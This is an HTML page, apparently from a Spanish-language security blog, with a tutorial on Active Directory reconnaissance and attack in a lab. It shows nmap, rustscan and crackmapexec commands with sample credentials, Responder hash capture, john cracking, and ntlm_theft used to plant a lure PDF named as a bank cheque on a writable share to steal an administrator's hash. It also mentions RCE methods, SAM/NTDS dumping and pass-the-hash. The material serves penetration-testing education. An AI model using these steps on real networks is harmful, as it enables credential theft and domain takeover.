@@ -1,0 +1,251 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Reconocimiento &amp; Enumeración AD // 0xl3mon🕷</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="0xl3mon" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://0xl3mon.github.io/css/main.min.7f004fbb8e19cf18afcf8a5fa13c66aae1fd075af8c583ae7b97a7b5aef1db40.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Reconocimiento &amp; Enumeración AD"/>
+<meta name="twitter:description" content="En este articulo rasparemos un poco sobre distintas metodologias a la hora de enumerar activos en una red , sobre todo cuando se trata de listar puertos, servicios y las versiones de los servicios que para etapas posteriores nos servira para buscar posibles vulnerabilidades.
+ping -c 2 10.10.124.125 lo que hacemos con la utilidad ping es basicamente enviar un paquete ICMP del tipo echo request para comprobar el estado de comunicacion entre nuestro equipo y el host de destino, es decir si el host esta activo nos devolvera la peticion ICMP con un echo reply."/>
+
+    <meta property="og:title" content="Reconocimiento &amp; Enumeración AD" />
+<meta property="og:description" content="En este articulo rasparemos un poco sobre distintas metodologias a la hora de enumerar activos en una red , sobre todo cuando se trata de listar puertos, servicios y las versiones de los servicios que para etapas posteriores nos servira para buscar posibles vulnerabilidades.
+ping -c 2 10.10.124.125 lo que hacemos con la utilidad ping es basicamente enviar un paquete ICMP del tipo echo request para comprobar el estado de comunicacion entre nuestro equipo y el host de destino, es decir si el host esta activo nos devolvera la peticion ICMP con un echo reply." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xl3mon.github.io/posts/reconocimiento-enumeraci%C3%B3n-ad/" />
+<meta property="article:published_time" content="2022-04-12T12:49:50+02:00" />
+<meta property="article:modified_time" content="2022-04-12T12:49:50+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://0xl3mon.github.io/"><img class="app-header-avatar" src="/avatar/cat-profile.jpg" alt="0xl3mon" /></a>
+      <h1>0xl3mon🕷</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/">𝘏𝘰𝘮𝘦</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">𝘏𝘢𝘤𝘬𝘛𝘩𝘦𝘉𝘰𝘹</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">𝘈𝘣𝘰𝘶𝘵</a>
+      </nav>
+      <p>ℂ𝕪𝕓𝕖𝕣𝕊𝕖𝕔𝕦𝕣𝕚𝕥𝕪 𝔹𝕝𝕠𝕘 </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/0xl3mon" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/rodrigo-flores-36847a233/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Reconocimiento &amp; Enumeración AD</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 12, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          7 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>En este articulo rasparemos un poco sobre distintas metodologias a la hora de enumerar activos en una red , sobre todo cuando se trata de listar puertos, servicios y las versiones de los servicios que para etapas posteriores nos servira para buscar posibles vulnerabilidades.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ping -c <span style="color:#ae81ff">2</span> 10.10.124.125
+</code></pre></div><p>lo que hacemos con la utilidad <code>ping</code>  es basicamente enviar un paquete <strong>ICMP</strong> del tipo <code>echo request</code> para comprobar el estado de comunicacion entre nuestro equipo y el host de destino, es decir si el host esta activo nos devolvera la peticion ICMP con un <code>echo reply</code>.</p>
+<p>Aunque con esto no quiero decir que en el caso de que un servidor no nós devuelva la petición el host está apagado si no que a lo mejor se establecieron reglas de firewall para bloquear ese tipo de solicitudes ICMP con el fin de evitar la enumeracion de equipos activos en una red.</p>
+<h4 id="un-poco-de-nmap">Un poco de Nmap</h4>
+<p><img src="https://i.imgur.com/VfyH9TN.png" alt=""></p>
+<p>Lo mas basico primero seria comprobar que servidores estan activos dentro de un/os segmento/s de red y por sobre todo analyzar el hacer uso de herramientas como  <strong>Nmap</strong>, <strong>Crackmapexec</strong>, <strong>Masscan</strong>, <strong>Rustscan</strong></p>
+<p><strong>nmap</strong> tiene extensas funcionalidades no sólo para descubrimiento. Sí a eso le sumas su motor de scripts <strong>NSE</strong>, donde puedes agregar funcionalidades extras , es decir nos sirve para <strong>recon</strong>, <strong>enumeracion</strong> e inclusive <strong>explotacion</strong>, a continuacion mostraremos unos ejemplos interesantes con las siguientes opciones.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">--packet-trace: flag para mostrar un sumario de cada paquete que se envia y se recibe.
+
+-sP : nos sirve para sondear la red (envia paquetes echo reply ICMP, y espera su respuesta).
+
+-n : Para que no haga una resolucion dns es decir, que no convierta el ip a nombre de dominio a traves de una consulta DNS
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -n -sP 10.10.124.155 --packet-trace
+
+</code></pre></div><p><img src="https://i.imgur.com/7g00QPd.png" alt=""></p>
+<p>Probando Distintos modos de escaneo con Nmap : SYN <strong>(Sigiloso y eficiente)</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">1. -sS : Un Scaneo sigiloso del tipo TCP/SYN , es un escaneo rapido y eficiente no es restringido por firewalls 
+
+2. -sT : Similar al escaneo TCP/SYN anterior con la diferencia de que este completa la conexion para despues despues finalizarla 
+</code></pre></div><p>para entender los siguientes tipos de escaneo miremos las imagenes a continuación</p>
+<ol>
+<li><strong>Escaneo sigiloso SYN</strong> ya que no completa su conexion envia el paquete SYN, recibe el SYN/ACK pero no responde con un ACK para completar el saludo de 3 vias <strong>(3 way handshake)</strong> si no que envia un paquete <strong>RST</strong> para decirle que hubo un error y que reinicie la conexion.</li>
+</ol>
+<p><img src="https://i.imgur.com/uS4h1u5.png" alt="">
+En en caso de que el escaneo SYN sigiloso no sea efectivo, tiraremos de un escaneo <strong>TCP</strong> (siguiente ejemplo)</p>
+<ol start="2">
+<li><strong>Escaneo TCP</strong> a diferencia del escaneo anterior completamos la conexion con nuestro paquete ACK es decir enviamos nuestro paquete SYN el servidor nos reponde con un SYN/ACK , le devolvemos el ACK (completando el 3 way handshake) y le respondemos con UN RST para que finalize la conexion o la reinicie</li>
+</ol>
+<p><img src="https://i.imgur.com/ZCmcoAT.png" alt=""></p>
+<p>Aqui comprobaremos los puertos abiertos, especificandole a nmap que queremos las siguientes opciones :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">-sS : TCP SYN <span style="color:#f92672">(</span>sigiloso<span style="color:#f92672">)</span>
+--min-parallelism : especifica el número mínimo de operaciones de escaneo de puertos paralelos. es decir para que divida la operacion en problemas mas pequeños y sea <span style="color:#f92672">(</span>eficiente<span style="color:#f92672">)</span>
+--max-rtt-timeout :  se utiliza para especificar el tiempo de espera máximo de RTT <span style="color:#f92672">(</span>tiempo de ida y vuelta<span style="color:#f92672">)</span> para una respuesta de paquete
+-p- : Todos los puertos, parecido a -p 1-65535 en rango de enteros
+--open : Con estado open/abierto
+-n : No haga resolucion DNS
+-Pn : No haga descubrimiento con ICMP, osea no envie el paquete ECHO REQUEST y se quede esperando su respuesta ECHO REPLY
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -sS --min-parallelism <span style="color:#ae81ff">1000</span> --max-rtt-timeout 100ms -p- --open 10.10.124.155 -n -Pn -vvv
+</code></pre></div><p><img src="https://i.imgur.com/XCLbxJB.png" alt=""></p>
+<h4 id="rustscan">Rustscan</h4>
+<p><strong>Enumeracion Basica con Rustscan</strong>
+Scanner para mapear redes escrito en RUST bastante rapido (Nmap puede ser igual de rapido si jugamos con las opciones correctas), para usarlo como complemento de nmap esta bastante bien, ya que puedes usarlo junto con nmap es decir puedes utilizar rust para recon y nmap para enumerar versiones y servicios de los puertos anteriormente reconocidos ejemplo:</p>
+<pre><code>rustscan -a 10.10.124.132 --ulimite 5000 -- -n -Pn 
+</code></pre><p><img src="https://i.imgur.com/RHAedzt.png" alt=""></p>
+<h4 id="crackmapexec">Crackmapexec</h4>
+<p>La navaja suiza del pentesting, escrita en python sirve tanto para enumeracion tambien como para postexplotacion, utiliza librerias de impackets en su suite , soporta distintos protocolos como <strong>mssql,ssh,winrm,ldap,smb</strong> con ella la creatividad juega un rol importate. Podemos hacer un sin fin de cosas desde fuerza bruta a ofuzcar scripts en powershell, utilizar arhivos customs de AMSI bypass, subir, ejecutar, ficheros, dumpear hashes, lo podemos utilizar para movimiento lateral con pass the hash y demas. es decir es una <strong>Navaja Suiza</strong> literal.</p>
+<ul>
+<li><strong>Recon Basica Crackmapexec</strong>
+Mapeando la red de un dominio para listar informacion interesante para etapas posteriores de explotación.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cme -t <span style="color:#ae81ff">200</span> smb 10.10.124.0./24 --gen-relay-list NotSmbSigning.txt
+</code></pre></div><p><img src="https://i.imgur.com/wD0BuJS.png" alt=""></p>
+<ul>
+<li><strong>Listar Modulos con crackmapexec</strong>
+Como vemos toda una seccion de modulos enteros como por ejemplo lograr ejecutar un ingestor de Bloodhound para recopilar informacion de todo el dominio este paso nos ahorra muchisimo tiempo para no andar jugando con la red e ir directamente a donde queremos llegar.</li>
+</ul>
+<p><img src="https://i.imgur.com/p0RZds2.png" alt=""></p>
+<ul>
+<li><strong>Enumeracion basica con crackmapexec</strong>
+Ejemplo de enumeracion basica con un usario con bajos privilegios en la red de un dominio con crackmapexec.</li>
+</ul>
+<pre><code>cme -t 200 smb 10.10.124.0/24 -u Consultant -p Password123! -d child.evilcorp.local --shares --session --loggedon-users --local-groups
+</code></pre><p><img src="https://i.imgur.com/8Hl5P6O.png" alt="">
+como vemos logramos enumerar sesiones logueados, recursos compartidos , y algunos grupos locales.</p>
+<p>Esto es un pequeño ejemplo de todo lo que puede hacer con CRACKMAPEXEC incluyendo que tambien puede lograr <strong>Remote Code Execution</strong> con distintos metodos como wmiexec, atexec, smbexec, mmcexec, winrm lo invito a que juegue un poco con el en su laboratorio.</p>
+<ul>
+<li><strong>RCE</strong> Informacion util a tener en cuenta a la hora de queres ejecutar comandos con cuentas privilegiadas</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Metodo</th>
+<th>Tipo de RCE</th>
+<th>Puertos usados</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Wmiexec</td>
+<td>Cmd/Powershell</td>
+<td>TCP:(135, 445, 50911)</td>
+</tr>
+<tr>
+<td>Atexec</td>
+<td>Cmd/Powershell</td>
+<td>TCP: 445</td>
+</tr>
+<tr>
+<td>Smbexec</td>
+<td>Cmd/Powershell</td>
+<td>TCP: 445</td>
+</tr>
+<tr>
+<td>Mmcexec</td>
+<td>Cmd/Powershell</td>
+<td>TCP:(135,445,49751 DCOM)</td>
+</tr>
+<tr>
+<td>winrm</td>
+<td>Cmd/Powershell</td>
+<td>TCP:(5985, 5986)</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="capturando-hashes">Capturando Hashes</h3>
+<h4 id="responder">Responder</h4>
+<p>Responder es un envenenador de trafico y sniffer que hace de Man in the Midle envenenando trafico de distintos protocolos como <strong>NBT-NS</strong>,<strong>LLMNR</strong>, <strong>NTLM</strong>, <strong>SMB</strong>, <strong>MSSQl</strong> .</p>
+<p><strong>LLMNR/NBT-NS</strong>: Se utiliza como alternativa de resolucion de nombres cuando el DNS no esta funcionando correctamente</p>
+<p><img src="https://i.imgur.com/hRTz3tJ.png" alt=""></p>
+<ul>
+<li>Crackeando el hash <strong>netntlmv2</strong> capturado por el responder</li>
+</ul>
+<ol>
+<li>Identificamos el tipo de hash</li>
+<li>le indicamos a john el formato del hash y el diccionario junto con el hash</li>
+<li>crackeamos el hash</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat &gt; hash
+hashid -j hash
+john --format<span style="color:#f92672">=</span>netntlmv2 --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash
+john hash --show
+</code></pre></div><p><img src="https://i.imgur.com/MOFz1mA.png" alt=""></p>
+<h4 id="capturando-hashes-con-ntlm_theft">Capturando Hashes con ntlm_theft</h4>
+<p>conseguir credenciales de acceso válidas en la mayoría de los casos es fundamental para continuar con etapas posteriores de post explotacion, en este caso realizaremos una pequeña prueba de con la herramienta <strong>ntlm_theft</strong> que basicamente lo que hace es generar un template de un fichero apuntando hacia nuestro servidr con el responder (donde estaremos envenenando la red) para capturar hashes en este caso lo que haremos sera</p>
+<ol>
+<li>Crear el fichero malicioso para subirlo a un recurso de la red</li>
+<li>Subir ese fichero con smbmap/crackmapexec (ya que disponemos de credenciales de bajo privilegio)</li>
+<li>Ejecutar el responder para que este en escucha envenenando las conexiones para extrar hashes.</li>
+<li>Esperar a que el usuario victima haga click en el recurso y su trafico sea redirigido a nuestro servidor con el responder activo</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python3 ntlm_theft.py
+python3 ntlm_theft.py --server 10.10.124.240 --generate pdf -f cheque_a_cobrar.pdf
+</code></pre></div><ul>
+<li>
+<p>Creacion del fichero con <strong>ntlm_theft</strong>
+<img src="https://i.imgur.com/gkNTOt3.png" alt=""></p>
+</li>
+<li>
+<p>Enumeramos la carpeta con permisos de escritura, para subir nuestro archivo malicioso.</p>
+</li>
+<li>
+<p>Subimos el fichero con smbmap, ya que enumeramos anteriormente con crackmapexec y nos dimos cuenta que hay una carpeta con permisos de escritura.</p>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -H 10.10.124.155
+smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$
+smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$<span style="color:#ae81ff">\\</span>consultant
+smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$<span style="color:#ae81ff">\\</span>consultant  --upload cheque_bancario.pdf  SharedFolder<span style="color:#ae81ff">\$</span>/consultant/cheque_bancario.pdf
+
+</code></pre></div><p><img src="https://i.imgur.com/1F68Ocd.png" alt=""></p>
+<p>Una vez subido nuestro fichero malicioso creado con <strong>ntlm_theft</strong>, esperamos a que alguien curioso quiera fijarse que clase de cheque bancario es.</p>
+<p><img src="https://i.imgur.com/mtLKzeE.png" alt=""></p>
+<p>Y en nuestro responder veremos que la persona que abrio nuestro pdf es una cuenta con privilegios de administrador, podriamos intentar crackearlo y con suerte nos hacemos con el dominio entero</p>
+<p><img src="https://i.imgur.com/bWto63j.png" alt=""></p>
+<p>a continuación intentaremos ejecutar un comando remoto &lsquo;whoami&rsquo; a modo de prueba, para despues terminar dumpeando la sam local o bien el ntds del dominio , para poder hacer <strong>pass the hash</strong>, aunque ya teniendo una cuenta privilegiada, podemos activar el modulo de RDP con crackmapexec o simplemente loguearnos por <strong>WINRM</strong> en el caso de que tenga el puerto 5987 y si no lo tiene abierto podemos habilitarlo quitando las reglas de firewall ya que tenemos ejecucion remota de comando a traves del smb.</p>
+<p><img src="https://i.imgur.com/aEATcdm.png" alt=""></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
